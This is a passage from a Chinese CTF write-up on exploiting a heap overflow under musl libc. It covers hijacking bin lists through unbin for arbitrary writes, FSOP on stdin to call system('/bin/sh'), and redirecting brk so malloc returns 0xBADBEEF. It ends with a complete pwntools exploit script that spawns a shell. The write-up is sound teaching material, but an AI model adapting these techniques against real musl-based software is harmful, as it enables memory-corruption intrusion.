#### <a class="reference-link" name="4.2.1%20%E5%8A%AB%E6%8C%81%20bin%20%E9%93%BE%E8%A1%A8"></a>4.2.1 劫持 bin 链表

```
add(0x10, 'A'*0x10) #1
add(0x10, 'B'*0x10) #2, prevent consolidation
add(0x10, 'C'*0x10) #3
add(0x10, 'D'*0x10) #4, prevent consolidation

free(1)
free(3)
```

首先分配 4 个大小为 0x20 字节的 chunk，然后释放 chunk 1 和 chunk 3。释放的 chunk 进入到`mal.bins[0]`链表，`mal.bins[0]-&gt;head`指针指向 chunk 1。

```
bin = libc_base + 0x292e40 # mal.bins[38]-&gt;head

next = bin - 0x10
prev = fake_chunk

payload  = 'X' * 0x10
payload += p64(0x21) * 2 + 'X' * 0x10
payload += p64(0x21) + p64(0x20) + p64(next) + p64(prev)
payload += p8(0x20)
payload += 'n'

add(0x10, payload, 'Y') #1, heap overflow
```

然后分配一个 0x20 字节 chunk，malloc 从`mal.bins[0]`取出`head`指针指向的 chunk 1，更新`head`指针指向 chunk 3。堆溢出 chunk 1，改写 chunk 3 `prev`指针、`next`指针为 fake chunk 地址、`mal.bins[38]-&gt;head`指针地址。

```
add(0x10) # 3, unbin #1
```

再次分配 0x20 字节 chunk，malloc 对 chunk 3 进行 unbin，将 fake chunk 地址写到`mal.bins[38]-&gt;head`指针上。

```
add(0x50) # 5, fake chunk
```

最后分配一个 0x60 字节的 chunk，malloc 从`mal.bins[38]`取出 fake chunk，返回 fake chunk 地址。

```
edit(3, p64(next) + p64(prev2))
add(0x10) # 3, unbin #2
add(0x50) # 5, fake_chunk #2

edit(3, p64(next) + p64(prev3))
add(0x10) # 3, unbin #3
add(0x50) # 6, fake_chunk #3

edit(3, p64(next) + p64(prev4))
add(0x10) # 3, unbin #4
add(0x50) # 7, fake_chunk #4

edit(3, p64(next) + p64(prev5))
add(0x10) # 3, unbin #5
add(0x50) # 8, fake_chunk #5

[......]
```

由于`mal.bins[0]`链表已被破坏，`mal.bins[0]-&gt;head`指针不再更新，继续指向 chunk 3。通过不断修改 chunk 3 的`prev`指针，我们可以实现多次任意地址写。

#### <a class="reference-link" name="4.2.2%20%E6%9E%84%E9%80%A0%20fake%20chunk"></a>4.2.2 构造 fake chunk

由于 malloc 不检查 chunk 的头部，只要 fake chunk 的`prev`和`next`指针指向合法地址，就能通过 unbin 从 bin 链表中取出，即`*(uint64_t*)(fake_chunk + 2)`和`*(uint64_t*)(fake_chunk + 3)`的值是一个可写的内存块地址。

除了利用现有的 fake chunk，我们还可以利用 unbin 在任意内存块上构造 fake chunk：

```
fake_chunk = target - 0x10

edit(3, p64(fake_chunk) + p64(fake_chunk))
add(0x10) # 3, unbin
```

假设待控制的内存块地址为`target`。将 chunk 3 的`prev`和`next`指针同时设为`target - 0x20`，然后 unbin。

[![](https://p4.ssl.qhimg.com/t01cadec260e8b24a98.png)](https://p4.ssl.qhimg.com/t01cadec260e8b24a98.png)

unbin 之前。

[![](https://p0.ssl.qhimg.com/t01493e7225dedb3e7c.png)](https://p0.ssl.qhimg.com/t01493e7225dedb3e7c.png)

经过 unbin 之后，fake chunk 的`prev`和`next`指针被 unbin 改写为 fake chunk 地址，恰好满足构造条件。

```
free(n) # chunk n 的大小为 0x20
```

然后释放一个 0x20 字节的 chunk。

```
// src/malloc/malloc.c L188-L191
static void unbin(struct chunk *c, int i)
`{`
    if (c-&gt;prev == c-&gt;next)
        a_and_64(&amp;mal.binmap, ~(1ULL&lt;&lt;i));

[...]
`}`
```

```
void __bin_chunk(struct chunk *self)
`{`

[...]
    // src/malloc/malloc.c L482-L483
    if (!(mal.binmap &amp; 1ULL&lt;&lt;i))
        a_or_64(&amp;mal.binmap, 1ULL&lt;&lt;i);

[...]
`}`
```

这是因为当`prev`和`next`指针相等时，unbin 会将`mal.bins[0]`设置为空 bin。导致`mal.bins[0]`不可用。只要释放任意 0x20 的 chunk ，`mal.bins[0]`就能重新设置为非空 bin。

注意待释放的 chunk 前后不能有空闲 chunk，否则 free 将其进行合并，导致 chunk 被释放到其他的 bin 中。

```
edit(3, p64(bin - 0x10) + p64(fake_chunk))
add(0x10) # 3, unbin
add(0x50) # n+1, target
```

最后利用 unbin 将 fake_chunk 地址写到`mal.bins[38]-&gt;head`指针上，最终控制`target`。

### <a class="reference-link" name="4.3%20FSOP"></a>4.3 FSOP

泄漏 libc 基址和实现任意地址写之后，接下来考虑如何劫持程序控制流来拿 shell。musl libc 没有类似`__malloc_hook`之类可以方便劫持控制流的 hook 函数，目前可行的方法只有做 FSOP，覆盖`FILE`结构体上面的函数指针（若不考虑上面提到的非预期解）。

```
pwndbg&gt; ptype stdin
type = struct _IO_FILE `{`
    unsigned int flags;
    unsigned char *rpos;
    unsigned char *rend;
    int (*close)(FILE *);
    unsigned char *wend;
    unsigned char *wpos;
    unsigned char *mustbezero_1;
    unsigned char *wbase;
    size_t (*read)(FILE *, unsigned char *, size_t);
    size_t (*write)(FILE *, const unsigned char *, size_t);
    off_t (*seek)(FILE *, off_t, int);
    unsigned char *buf;
    size_t buf_size;
    FILE *prev;
    FILE *next;
    int fd;
    int pipe_pid;
    long lockcount;
    int mode;
    volatile int lock;
    int lbf;
    void *cookie;
    off_t off;
    char *getln_buf;
    void *mustbezero_2;
    unsigned char *shend;
    off_t shlim;
    off_t shcnt;
    FILE *prev_locked;
    FILE *next_locked;
    struct __locale_struct *locale;
`}` * const
pwndbg&gt; vmmap stdin
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x7ffff7ffb000     0x7ffff7ffc000 rw-p     1000 92000  /pwn/Debug/libc.so
pwndbg&gt;
```

上面是`_IO_FILE`结构体的定义。musl libc 版 `_IO_FILE`结构体没有专门的 vtable，只有四个函数指针`close`、`read`、`write`和`seek`且分布在结构体中的不同位置。由于`stin`、`stdout`和`stderr`结构体所处的内存块可写，我们可以通过任意地址写来改写上面的内容。

```
// sub_400E07
p = (char *)malloc(size);
if ( p == (char *)0xBADBEEF )
`{`
  sub_400AEC("ERROR: Bad beefn");
  exit(-1);
`}`
```

在程序中，有一处地方调用了`exit` 函数。

```
// src/exit/exit.c L27-L33
_Noreturn void exit(int code)
`{`
    __funcs_on_exit();
    __libc_exit_fini();
    __stdio_exit();  &lt;---
    _Exit(code);
`}`
```

```
// src/stdio/__stdio_exit.c L16-L23
void __stdio_exit(void)
`{`
    FILE *f;
    for (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);
    close_file(__stdin_used);  &lt;---
    close_file(__stdout_used);
    close_file(__stderr_used);
`}`
```

```
// src/stdio/__stdio_exit.c L8-L14
static void close_file(FILE *f)
`{`
    if (!f) return;
    FFINALLOCK(f);
    if (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, 0, 0);  &lt;---
    if (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);
`}`
```

翻阅源码，发现`exit`函数后来调用`__stdio_exit`函数来关闭所有打开的文件流。在`close_file`函数中，如果文件流`f`符合条件`f-&gt;wpos != f-&gt;wbase`，则调用`f`文件结构体上的`write`函数指针：`f-&gt;write(f, 0, 0)`。

```
payload  = "/bin/shx00"    # stdin-&gt;flags
payload += 'X' * 32
payload += p64(0xdeadbeef)  # stdin-&gt;wpos
payload += 'X' * 8
payload += p64(0xbeefdead)  # stdin-&gt;wbase
payload += 'X' * 8
payload += p64(system)      # stdin-&gt;write

edit(stdin, payload)
```

触发 FSOP 的条件十分简单：只要向`stdin`结构体的首 8 字节写入`/bin/shx00`，将`write`指针指向`system`函数，令`stdin-&gt;wpos != stdin-&gt;wbase`，最后调用`exit`函数即可拿到 shell。

除了`exit`函数之外，`scanf`、`printf`和`puts`之类的标准 IO 库函数里面也有类似的 FSOP 触发点。有兴趣的话可以自行翻阅相关函数的源码。

### <a class="reference-link" name="4.4%20%E8%BF%94%E5%9B%9E%200xBADBEEF"></a>4.4 返回 0xBADBEEF

但是想要调用`exit`函数，`malloc`返回的地址必须为`0xBADBEEF`，`0xBADBEEF`显然不是一个合法的内存地址。而通过修改 libc 内部一个名为`brk`的全局变量，不但将`0xBADBEEF`变为一个能够正常访问的地址，还能让`malloc`返回该地址。

```
// src/malloc/malloc.c L303-L315
void *malloc(size_t n)
`{`

[...]

    for (;;) `{`
        uint64_t mask = mal.binmap &amp; -(1ULL&lt;&lt;i);
        // 若所有的可用 bin 均为空，调用 expand_heap 函数延展堆空间，生成新的 chunk
        if (!mask) `{`
            c = expand_heap(n);  &lt;---
            if (!c) return 0;
            // 向前合并空闲 chunk
            if (alloc_rev(c)) `{`
                struct chunk *x = c;
                c = PREV_CHUNK(c);
                NEXT_CHUNK(x)-&gt;psize = c-&gt;csize =
                    x-&gt;csize + CHUNK_SIZE(c);
            `}`
            break;
        `}`

[...]
`}`
```

当所有可用 bin 均为空时，`malloc`调用`expand_heap`函数延展堆内存空间，生成新的 chunk。`expand_heap`函数内部调用了`__expand_heap`函数。

```
// src/malloc/expand_heap.c L39-L61
void *__expand_heap(size_t *pn)
`{`
    static uintptr_t brk;  // brk 是一个全局变量
    static unsigned mmap_step;
    size_t n = *pn;  // n 是 chunk 长度

    // n 的最大允许值为 0x7FFFFFFFFFFFEFFF
    if (n &gt; SIZE_MAX/2 - PAGE_SIZE) `{`
        errno = ENOMEM;
        return 0;
    `}`
    n += -n &amp; PAGE_SIZE-1;

    // 若 brk 指针为 NULL，使其指向当前数据段的末尾位置
    if (!brk) `{`
        brk = __syscall(SYS_brk, 0);
        brk += -brk &amp; PAGE_SIZE-1;
    `}`

    // 调用 brk 系统调用，将数据段延展至 brk+n 地址
    // 若成功，返回 brk 指针
    if (n &lt; SIZE_MAX-brk &amp;&amp; !traverses_stack_p(brk, brk+n)
        &amp;&amp; __syscall(SYS_brk, brk+n)==brk+n) `{`   &lt;---
        *pn = n;
        brk += n;
        return (void *)(brk-n);
    `}`

    // 若 brk 失败，返回 mmap 内存
    [...]
`}`
```

在`__expand_heap`函数中，`brk`是指向数据段（data segment，即动态内存）末尾位置的指针。`__expand_heap`函数调用 brk 系统调用`__syscall(SYS_brk, brk+n)`，将数据段末尾向后延展`n`字节，然后延展部分返回给`malloc`作为新的 chunk 分配给用户。

若程序不开启 PIE，数据段的地址长度为 24 bit（`0~0x2000000`），内存位置与`0xBADBEEF`比较接近。若将`brk`指针修改为`0xBADBEEF - n`，brk 系统调用就会把数据段延展至`0xBADBEEF`，使其成为可访问的内存地址。

```
edit(binmap,  'X' * 16 + p64(0))
edit(brk,     p64(0xbadbeef - 0x20))

add(0) # 0xbadbeef
```

将`mal.binmap`设为`NULL`、`brk`设为`0xbadbecf`，然后用`add(0)`分配一个 0x20 字节 chunk，最终得到`0xBADBEEF`。

注意需要在`mal.binmap`往前的地方构造 fake chunk，防止破坏原来的`binmap`值。

### <a class="reference-link" name="4.5%20%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC"></a>4.5 利用脚本

漏洞利用 Python 脚本如下：

```
#!/usr/bin/env python2
from pwn import *
import sys

context(arch="amd64", log_level="debug")

if len(sys.argv) &gt;= 3:
    p = remote(sys.argv[1], sys.argv[2])
else:
    p = process("./carbon")

def alloc(sz, ctx='n', ans='N'):
    p.sendlineafter("&gt;", '1')
    p.sendlineafter("What is your prefer size? &gt;", str(sz))
    p.sendlineafter("Are you a believer? &gt;", ans)
    p.sendafter("Say hello to your new sleeve &gt;", ctx)

def free(idx):
    p.sendlineafter("&gt;", '2')
    p.sendlineafter("What is your sleeve ID? &gt;", str(idx))

def edit(idx, ctx):
    p.sendlineafter("&gt;", '3')
    p.sendlineafter("What is your sleeve ID? &gt;", str(idx))
    p.send(ctx)

def view(idx):
    p.sendlineafter("&gt;", '4')
    p.sendlineafter("What is your sleeve ID? &gt;", str(idx))
    return p.recvuntil("Done.", True)

alloc(0x1, 'A') #0

libc_base = u64(view(0).ljust(8, 'x00')) - 0x292e41

info("libc base: 0x%x", libc_base)
stdin   = libc_base + 0x292200
binmap  = libc_base + 0x292ac0
brk     = libc_base + 0x295050
bin     = libc_base + 0x292e40
system  = libc_base + 0x42688

# 1. construct fake chunks
alloc(0x10) #1
alloc(0x10) #2, prevent consolidation
alloc(0x10) #3
alloc(0x10) #4, prevent consolidation
alloc(0x10) #5
alloc(0x10) #6, prevent consolidation
alloc(0x10) #7
alloc(0x10) #8, prevent consolidation

free(1)
free(3)

payload  = 'X' * 0x10
payload += p64(0x21) * 2 + 'X' * 0x10
payload += p64(0x21) + p64(0x20) + p64(stdin - 0x10) * 2
payload += p8(0x20)
payload += 'n'

alloc(0x10, payload, 'Y')   #1
alloc(0x10)                 #3
free(1) # set as non-empty bin

edit(3, p64(binmap - 0x20) * 2)
alloc(0x10)             #1
free(5) # set as non-empty bin

edit(3, p64(brk - 0x10) * 2)
alloc(0x10)             #5
free(7) # set as non-empty bin

# 2. corrupt bin head and get arbitrary pointers
edit(3, p64(bin - 0x10) + p64(stdin - 0x10))
alloc(0x10) #7
alloc(0x50) #9

edit(3, p64(bin - 0x10) + p64(brk - 0x10))
alloc(0x10) #10
alloc(0x50) #11

edit(3, p64(bin - 0x10) + p64(binmap - 0x20))
alloc(0x10) #12
alloc(0x50) #13

# 3. corrupt stdin, binmap and brk
payload  = "/bin/shx00"    # stdin-&gt;flags
payload += 'X' * 0x20
payload += p64(0xdeadbeef)  # stdin-&gt;wpos
payload += 'X' * 8
payload += p64(0xbeefdead)  # stdin-&gt;wbase
payload += 'X' * 8
payload += p64(system)      # stdin-&gt;write

edit(9, payload) # stdin
edit(11, p64(0xbadbeef - 0x20) + 'n')  # brk
edit(13, 'X' * 0x10 + p64(0) + 'n')    # binmap

# 4. get shell
p.sendlineafter("&gt;", '1')
p.sendlineafter("What is your prefer size? &gt;", '0')

p.interactive()
```



## 5. 总结

本文展示了在 musl libc 环境下，如何利用堆溢出漏洞劫持 bin 链表头部，通过 unbin 修改链表指针实现任意地址写，最后通过 FSOP 得到 shell。此外，还介绍了 musl libc 堆管理器的大致实现、malloc 返回任意堆地址的方法、出题失误以及其修复方法。



## 6. 参考
1. [musl libc 源码（Github 镜像）](https://github.com/bminor/musl)
1. [mmap 帮助文档](http://man7.org/linux/man-pages/man2/mmap.2.html)
1. [mmap 地址随机化实现](https://github.com/0xricksanchez/articles/tree/master/ASLR#mmap-randomization)
1. [brk 帮助文档](http://man7.org/linux/man-pages/man2/brk.2.html)
1. [brk 地址随机化实现](https://github.com/0xricksanchez/articles/tree/master/ASLR#brk-randomization)